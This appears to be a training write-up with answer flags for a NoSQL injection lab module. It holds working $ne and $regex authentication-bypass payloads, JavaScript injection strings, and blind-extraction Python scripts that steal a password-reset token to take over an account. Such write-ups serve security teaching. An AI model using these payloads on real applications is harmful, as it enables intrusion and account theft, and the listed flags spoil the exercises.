# Solutions

## Introduction to NoSQL Injection Module

### Section Questions Writeup

**Tier: 3**

**Difficulty: Medium**

**Type: Offensive**

**Created By: bmdyy**

**Co-Authors: -**

### Section Questions and their Answers

| Section                                     | Question Number | Answer                                   |
| ------------------------------------------- | --------------- | ---------------------------------------- |
| Introduction to NoSQL                       | Question 1      | HTB{2885698c71992448bae5ed76ed66ea67}    |
| Bypassing Authentication                    | Question 1      | HTB{a403c982035fac88fa39ecac905be74b}    |
| In-Band Data Extraction                     | Question 1      | HTB{81ea57dd0244b5e51a6bc4a7126c98cd}    |
| Blind Data Extraction                       | Question 1      | 82                                       |
| Automating Blind Data Extraction            | Question 1      | HTB{98e6bb6f0b04dbb68bcb4c1250715aa4}    |
| Server-Side JavaScript Injection            | Question 1      | N                                        |
| Automating Server-Side JavaScript Injection | Question 1      | HTB{N0\_m0r3\_md5,I'm\_Bu!Lt\_d1fF3reNt} |
| Skills Assessment I                         | Question 1      | HTB{7dd8c551035ea609a7f4fda61d4a23de}    |
| Skills Assessment II                        | Question 1      | HTB{924eedfac9bfc3b8bae2e90e00301e6c}    |

### Acronyms Used in Writeups

| Acronym | Meaning                                                 |
| ------- | ------------------------------------------------------- |
| STMIP   | Spawned Target Machine IP Address                       |
| STMPO   | Spawned Target Machine Port                             |
| PMVPN   | Personal Machine with a Connection to the Academy's VPN |
| PWNIP   | Pwnbox IP Address (or PMVPN IP Address)                 |
| PWNPO   | Pwnbox Port (or PMVPN Port)                             |

## Introduction to NoSQL

### Question 1

#### "Connect to the internal database. There is exactly one user whose first name is 6 letters long and starts with an 'R', and whose last name is 7 letters long and starts with a 'D'. What is the user's password?"

First, if not installed on `Pwnbox`/`PMVPN`, students need to install `mongosh`:

Code: shell

```shell
wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
echo "deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
sudo apt-get update
sudo apt-get install -y mongodb-mongosh
```

```shell-session
┌─[us-academy-2]─[10.10.14.243]─[htb-ac594497@htb-2bttb7cwfy]─[~]
└──╼ [★]$wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
echo "deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
sudo apt-get update
sudo apt-get install -y mongodb-mongosh

Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).
OK
deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse
Get:1 https://debian.neo4j.com stable InRelease [44.2 kB]
Get:2 https://repos.insights.digitalocean.com/apt/do-agent main InRelease [5,518 B]                                                                          
Get:3 https://packages.microsoft.com/debian/10/prod buster InRelease [29.8 kB]                                                                               
Ign:4 https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 InRelease
<SNIP>
```

Subsequently, students need to connect to the `MonogoDB` database on the spawned target machine:

Code: shell

```shell
mongosh mongodb://STMIP:STMPO
```

```shell-session
┌─[us-academy-2]─[10.10.14.243]─[htb-ac594497@htb-2bttb7cwfy]─[~]
└──╼ [★]$ mongosh mongodb://143.110.168.147:32136

Current Mongosh Log ID:	639b4e7dad6cdfbcf20a933c
Connecting to:		mongodb://143.110.168.147:32136/?directConnection=true&appName=mongosh+1.6.1
Using MongoDB:		6.0.3
Using Mongosh:		1.6.1

<SNIP>

   Enable MongoDB's free cloud-based monitoring service, which will then receive and display
   metrics about your deployment (disk utilization, CPU, operation statistics, etc).
   
   The monitoring data will be available on a MongoDB website with a unique URL accessible to you
   and anyone you share the URL with. MongoDB may use this information to make product
   improvements and to suggest MongoDB products and deployment options to you.
   
   To enable free monitoring, run the following command: db.enableFreeMonitoring()
   To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
------

test> 
```

Then, when listing the existing databases, students will notice the "internal" one, thus, they need to switch to it with `use` (please note that the fenced code blocks in this writeup and the module use "\`\`\`Javascript\`\`\`" as suggested in the [MonogoDB Developer Community Forums](https://www.mongodb.com/community/forums/t/format-and-colorize-json/2664)):

Code: javascript

```javascript
show databases;
use internal;
```

Code: javascript

```javascript
test> show databases;

admin      40.00 KiB
config     12.00 KiB
internal  120.00 KiB
local      40.00 KiB
test> use internal

switched to db internal
```

Subsequently, when listing collections, students will find the "accounts" one:

Code: javascript

```javascript
show collections;
```

Code: javascript

```javascript
internal> show collections;

accounts
```

Before querying the "accounts" collection, students first need to know its fields, finding the ones of interest to be "firstName" and "lastName":

Code: javascript

```javascript
Object.keys(db.accounts.findOne())
```

Code: javascript

```javascript
internal> Object.keys(db.accounts.findOne())

[
  '_id',
  'email',
  'username',
  'firstName',
  'lastName',
  'password',
  'role'
]
```

To find the target user, students can use the logical `$regex` operator:

Code: javascript

```javascript
db.accounts.find({firstName: {$regex: /^R.{5}$/}, lastName: {$regex: /^D.{6}$/}})
```

Code: javascript

```javascript
internal> db.accounts.find({firstName: {$regex: /^R.{5}$/}, lastName: {$regex: /^D.{6}$/}})

[
  {
    _id: ObjectId("6384c27567e78a6bfadc4c95"),
    email: 'rdomingo@mangodata.com',
    username: 'rdomingo',
    firstName: 'Roxana',
    lastName: 'Domingo',
    password: 'HTB{2885698c71992448bae5ed76ed66ea67}',
    role: 'user'
  }
]
```

Alternatively, students can also use the `$where` evaluation operator:

Code: javascript

```javascript
db.accounts.find({$where: `this.firstName.startsWith('R') && this.firstName.length == 6 && this.lastName.startsWith('D') && this.lastName.length == 7`})
```

Code: javascript

```javascript
internal> db.accounts.find({$where: `this.firstName.startsWith('R') && this.firstName.length == 6 && this.lastName.startsWith('D') && this.lastName.length == 7`})

[
  {
    _id: ObjectId("63ae389776080c72996bca5a"),
    email: 'rdomingo@mangodata.com',
    username: 'rdomingo',
    firstName: 'Roxana',
    lastName: 'Domingo',
    password: 'HTB{2885698c71992448bae5ed76ed66ea67}',
    role: 'user'
  }
]
```

The user that meets the criteria will be `Roxana Domingo`, with the flag `HTB{2885698c71992448bae5ed76ed66ea67}` being the value of the "password" field.

Answer: `HTB{2885698c71992448bae5ed76ed66ea67}`

## Bypassing Authentication

### Question 1

#### "Bypass authentication on MangoMail and submit the flag."

After spawning the target machine, students need to visit its website root page, fill the form fields with dummy data, open the Network tab (or use `Burp Suite`) of the Web Developer Tools (`Ctrl` + `Shift` + `E`) and click "Log in", to notice the intercepted POST request to `/index.php`:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_1.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_1.png)

Students need to click on on the request, then click `Resend` --> `Edit and Resend`:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_2.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_2.png)

Subsequently, students need to edit the request body parameters and change `email=` to become `email[$ne]=` and `password=` to `password[$ne]=`, therefore effectively rendering the query run in the backend to authenticate with existing credentials that do not match "test@test.test" for email nor "test" for "password" (which do not exist):

Code: javascript

```javascript
email[$ne]=test%40test.test&password[$ne]=test
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_3.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_3.png)

After sending the request and viewing the `Response` tab of the response, students will attain the flag `HTB{a403c982035fac88fa39ecac905be74b}`:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_4.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_4.png)

Alternatively, students can use other operators to subvert the authentication mechanism, such as the `$regex` operator, rendering the query run in the backend by to authenticate with any existing credentials:

Code: javascript

```javascript
email[$regex]=.*&password[$regex]=.*
```

Answer: `HTB{a403c982035fac88fa39ecac905be74b}`

## In-Band Data Extraction

### Question 1

#### "Use any payload you like to dump all facts from MangoSearch and submit the flag."

After spawning the target machine, students need to visit its website root page, fill the form field with any inexistent mango type (or any arbitrary string), and click on "Search", to notice that the search string is passed to the backend via the URL-parameter "q":

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_5.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_5.png)

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_6.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_6.png)

Subsequently, students need to use an operator that will result in all of the backend's data (specifically, the collection being queried) to be returned, such as with `$ne` or `$regex` (the former will be used), attaining the flag `HTB{81ea57dd0244b5e51a6bc4a7126c98cd}` for the mango with the name "\_259uihc2!":

Code: javascript

```javascript
?q[$ne]=doesNotExist
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_7.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_7.png)

Answer: `HTB{81ea57dd0244b5e51a6bc4a7126c98cd}`

## Blind Data Extraction

### Question 1

#### "Repeat the process shown in the section to leak the last two characters of Franz's tracking number. What are they?"

After spawning the target machine, students need to visit its website root page, have `Burp Suite` open to intercept requests (making sure that `FoxyProxy` is using the "BURP" pre-configured proxy), input the tracking number "32A766", then click on "Check":

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_8.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_8.png)

Subsequently, students need to send the intercepted request to `Repeater` (`Ctrl` + `R`), and use the `$regex` operator to check if the next digit of the tracking number is 1. However, it is not, as no tracking information of a package is returned:

Code: javascript

```javascript
{"trackingNum": {"$regex":"^32A7661.*"}}
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_9.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_9.png)

Students need to keep trying digits, and when trying the digit 8, they will receive back tracking information about an existing package:

Code: javascript

```javascript
{"trackingNum": {"$regex":"^32A7668.*"}}
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_10.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_10.png)

For the last digit, students will find that 2 does return the package information:

Code: javascript

```javascript
{"trackingNum": {"$regex":"^32A76682.*"}}
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_11.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_11.png)

Therefore, the last two digits needed to identify the tracking number are `82` (with the full tracking number being `32A76682`).

Answer: `82`

## Automating Blind Data Extraction

### Question 1

#### "Follow along with this section, recreate the script locally and dump the tracking number."

To dump the tracking number, students need to utilize the same Python script provided in the module, however only adjusting it for the spawned target machine IP and port:

Code: python

```python
#!/usr/bin/env python3

import requests, json

def oracle(t):
    request = requests.post("http://STMIP:STMPO/index.php", 
    headers = {"Content-Type": "application/json"}, 
    data = json.dumps({"trackingNum": t}))
    return "bmdyy" in request.text

assert(oracle("DoesNotExist") == False)
assert(oracle({"$regex": "^HTB{.*"}) == True)

trackingNum = "HTB{"

for _ in range(32):
    for character in "0123456789abcdef":
        if oracle({"$regex": "^" + trackingNum + character}):
            trackingNum += character
            break

trackingNum += "}"

assert(oracle(trackingNum))
print(trackingNum)
```

Subsequently, after running the script, students will attain the flag `HTB{98e6bb6f0b04dbb68bcb4c1250715aa4}`:

Code: shell

```shell
python3 oracle.py
```

```shell-session
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-feafcsk9tt]─[~]
└──╼ [★]$ python3 oracle.py

HTB{98e6bb6f0b04dbb68bcb4c1250715aa4}
```

Answer: `HTB{98e6bb6f0b04dbb68bcb4c1250715aa4}`

## Server-Side JavaScript Injection

### Question 1

#### "There is a user in the system whose username starts with 'HTB{'. Follow the steps in this section to extract the next character of the username. What is the character?"

After spawning the target machine, students need to visit its website's root page, attempt to log in with dummy data, and intercept the request with `Burp Suite` to send it to `Repeater` (`Ctrl` + `R`). Students need to bruteforce the next character of the username, starting from A-Z (as stated in the question's hint), finding the first one to be not "A", as the returned response does not indicate being singed in (students can also select the payload and press `Ctrl` + `U` to URL-encode it, however, it is not done in here):

Code: javascript

```javascript
" || (this.username.match("^HTB{A.*")) || ""=="&password=test
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_12.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_12.png)

Students need to keep trying upper case letters, and when trying the letter `N`, students will notice that the web application logs in, therefore, it is the first character:

Code: javascript

```javascript
" || (this.username.match("^HTB{N.*")) || ""=="&password=test
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_13.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_13.png)

Answer: `N`

## Automating Server-Side JavaScript Injection

### Question 1

#### "Follow along with this section, develop the script locally and dump the username from MangoOnline."

After spawning the target machine, students need to use the provided script in the module's section to dump the username from "MangoOnline":

Code: python

```python
#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus

def oracle(r):
    response = requests.post("http://STMIP:STMPO/", headers = {"Content-Type": "application/x-www-form-urlencoded"}, data = f"""username={(quote_plus('" || (' + r + ') || ""=="'))}&password=test""")
    return "Logged in as" in response.text

username = "HTB{"
i = 4
while username[-1] != "}":
    for character in range(32, 127):
        if oracle(f'this.username.startsWith("HTB{{") && this.username.charCodeAt({i}) == {character}'):
            username += chr(character)
            break
    i += 1

assert(oracle(f'this.username == `{username}`') == True)
print(f"Username: {username}")
```

After running the script, students will attain the flag `HTB{N0_m0r3_md5,I'm_Bu!Lt_d1fF3reNt}`:

Code: shell

```shell
python3 oracle.py
```

```shell-session
┌─[us-academy-2]─[10.10.14.207]─[htb-ac413848@htb-2vaaw2my1h]─[~]
└──╼ [★]$ python3 oracle.py

Username: HTB{N0_m0r3_md5,I'm_Bu!Lt_d1fF3reNt}
```

Alternatively, students can use the binary search algorithm:

Code: python

```python
#!/usr/bin/python3

import requests
from urllib.parse import quote_plus

def oracle(r):
    response = requests.post("http://STMIP:STMPO/", headers = {"Content-Type": "application/x-www-form-urlencoded"}, data = f"""username={(quote_plus('" || (' + r + ') || ""=="'))}&password=test""")
    return "Logged in as" in response.text

username = "HTB{"
i = 4

while username[-1] != "}":
    low = 32
    high = 127
    mid = 0

    while low <= high:
        mid = (high + low) // 2
        if oracle(f'this.username.startsWith("HTB{{") && this.username.charCodeAt({i}) > {mid}'):
            low = mid + 1
        elif oracle(f'this.username.startsWith("HTB{{") && this.username.charCodeAt({i}) < {mid}'):
            high = mid - 1
        else:
            username += chr(mid)
            break
    i += 1

assert (oracle(f'this.username == `{username}`') == True)
print(f"Username: {username}")
```

Code: shell

```shell
python3 oracle.py
```

```shell-session
┌─[us-academy-2]─[10.10.14.207]─[htb-ac413848@htb-umv3iuejom]─[~]
└──╼ [★]$ python3 oracle.py

Username: HTB{N0_m0r3_md5,I'm_Bu!Lt_d1fF3reNt}
```

The same flag will be attained.

Answer: `HTB{N0_m0r3_md5,I'm_Bu!Lt_d1fF3reNt}`

## Skills Assessment I

### Question 1

#### "Exploit the NoSQLi vulnerability in the API and submit the flag you find."

After spawning the target machine, and using the information provided for the scenario, students first need to test the API endpoint by attempting to sign in with the credentials `pentest:pentest`, receiving a (useless) token in the response:

Code: shell

```shell
curl -w "\n" -s -X POST "http://STMIP:STMPO/api/login" -H 'Content-Type: application/json' -d '{"username": {"$eq": "pentest"}, "password": {"$eq": "pentest"}}'
```

```shell-session
┌─[us-academy-2]─[10.10.14.207]─[htb-ac413848@htb-wxm3pmi2mf]─[~]
└──╼ [★]$ curl -w "\n" -s -X POST "http://138.68.182.130:30143/api/login" -H 'Content-Type: application/json' -d '{"username": {"$eq": "pentest"}, "password": {"$eq": "pentest"}}'

{"success":true,"username":"pentest","role":"user","token":"NTM2NjViM2lqYjUya2pxMzQ2NDV3Nm40MzU2bjQzNTYyCg=="}
```

Instead of using the `$eq` operator, students need to use a different one that will make the API query the database to return all users that are not named "pentest" nor having the password "pentest"; the `$ne` operator will be used, attaining the flag `HTB{7dd8c551035ea609a7f4fda61d4a23de}`:

Code: shell

```shell
curl -w "\n" -s -X POST "http://STMIP:STMPO/api/login" -H 'Content-Type: application/json' -d '{"username": {"$ne": "pentest"}, "password": {"$ne": "pentest"}}'
```

```shell-session
┌─[us-academy-2]─[10.10.14.207]─[htb-ac413848@htb-wxm3pmi2mf]─[~]
└──╼ [★]$ curl -w "\n" -s -X POST "http://138.68.182.130:30143/api/login" -H 'Content-Type: application/json' -d '{"username": {"$ne": "pentest"}, "password": {"$ne": "pentest"}}'

{"success":true,"username":"admin","role":"admin","token":"HTB{7dd8c551035ea609a7f4fda61d4a23de}"}
```

Answer: `HTB{7dd8c551035ea609a7f4fda61d4a23de}`

## Skills Assessment II

### Question 1

#### "Gain authenticated access to the website and submit the flag on the homepage."

After spawning the target machine, students need to visit its website's webpages and start manually fuzzing its endpoints for any injection vulnerabilities. However, prior to that, gaining situational awareness via intel gathering is mandatory.

For the `/login` webpage, students will notice that when any username entered is not "bmdyy", the error message differs by a full stop; for example, when trying the username "doesNotExist", the error message does not contain a full stop at the end of the sentence:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_14.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_14.png)

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_15.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_15.png)

However, when trying the username "bmdyy", the response message contains a full stop at the end, this is important later when developing the oracle, as the injection vulnerability is within the `/login` form submitted:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_16.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_16.png)

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_17.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_17.png)

From the above subtlety, students need to note that whenever an expression evaluates to true (as it did when the username "bmdyy" was used), the response will end in "credentials.", instead of "credentials" alone (i.e., without the full stop). Therefore, students need to construct a JavaScript injection payload that they can use for the oracle, most importantly, bypassing checking of the password:

Code: javascript

```javascript
" || true || "" != "
```

Code: javascript

```javascript
username=" || true || "" != "&password=doesNotMatterIamBypassed
```

Intercepting the response sent and injecting this payload instead of the username, students will receive a response ending with "credentials.", indicating the query evaluated to `true`:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_18.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_18.png)

However, when using `false` instead of `true`, students will receive a response that ends with "credentials", indicating that the query evaluated to `false`:

Code: javascript

```javascript
" || false || "" != "
```

Code: javascript

```javascript
username=" || false || "" != "&password=doesNotMatterIamBypassed
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_19.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_19.png)

Moreover, students will notice that in the `/reset` webpage, the token placeholder is 24 characters long, which is also crucial for later when dumping the password reset token (additionally, students will notice that only upper case letters and hyphens are used, thus, instead of testing for characters between 32-127, only 45-90 will be needed):

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_20.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_20.png)

With the gathered intel, students need to visit the `/forgot` webpage and request a password reset token for the user "bmdyy":

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_21.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_21.png)

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_22.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_22.png)

After the password reset token has been generated, students need to dump it from the database by utilizing the oracle and the previously gathered intel:

Code: python

```python
#!/usr/bin/env python3

from urllib.parse import quote_plus
import requests

def oracle(query):
    r = requests.post(
        "http://STMIP:STMPO/login",
        headers = {"Content-Type": "application/x-www-form-urlencoded"},
        data = f"username={quote_plus(query)}&password=doesNotMatterIamBypassed"
    )
    return "credentials." in r.text

passwordResetToken = ""
for i in range(24):
    low = 45
    high = 90
    mid = 0

    while low <= high:
        mid = (high + low) // 2
        if oracle(f'" || (this.username == "bmdyy" && this.token.charCodeAt({i}) > {mid}) || "" != "'):
            low = mid + 1
        elif oracle(f'" || (this.username == "bmdyy" && this.token.charCodeAt({i}) < {mid}) || "" != "'):
            high = mid - 1
        else: 
            passwordResetToken += chr(mid)
            break
```

After running the script, students will attain a password reset token:

Code: shell

```shell
python3 oracle.py
```

```shell-session
┌─[us-academy-2]─[10.10.14.207]─[htb-ac413848@htb-0j7gwcrwri]─[~]
└──╼ [★]$ python3 oracle.py

LXC4-JK00-BOKG-37YE-HCT9
```

Subsequently, with the attained password reset token for the user "bmdyy", students need to visit the `/reset` webpage and reset the password:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_23.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_23.png)

After supplying the token, students will be prompted to change the password, and it is always a good operations security practice to use a cryptographically secure password so that other threat agents can't gain access also. To generate one, students can use `openssl`:

```shell
openssl rand -hex 16
```

```shell-session
┌─[us-academy-2]─[10.10.14.207]─[htb-ac413848@htb-0j7gwcrwri]─[~]
└──╼ [★]$ openssl rand -hex 16

bafba58270d34b5db563fbec7f3b5fe6
```

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_24.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_24.png)

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_25.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_25.png)

After reseting the password, students need to sign in with the username "bmdyy" and the newly changed password, attaining the flag `HTB{924eedfac9bfc3b8bae2e90e00301e6c}`:

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_26.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_26.png)

![Introduction\_to\_NoSQL\_Injection\_Walkthrough\_Image\_27.png](https://academy.hackthebox.com/storage/walkthroughs/7/Introduction_to_NoSQL_Injection_Walkthrough_Image_27.png)

Answer: `HTB{924eedfac9bfc3b8bae2e90e00301e6c}`
